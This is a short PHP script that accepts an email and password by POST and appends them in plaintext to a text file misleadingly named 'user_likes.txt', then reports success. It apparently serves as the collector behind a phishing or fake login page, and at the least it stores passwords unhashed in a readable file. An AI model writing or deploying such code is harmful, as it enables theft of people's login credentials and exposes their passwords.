<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    $data = "Email: $email, Password: $password" . PHP_EOL;

    // Define the file path
    $file = 'user_likes.txt';

    // Save the data to the file
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    echo json_encode(['success' => true, 'message' => 'Data saved successfully!']);
} else {
    echo json_encode(['success' => false, 'message' => 'Invalid request.']);
}
?>
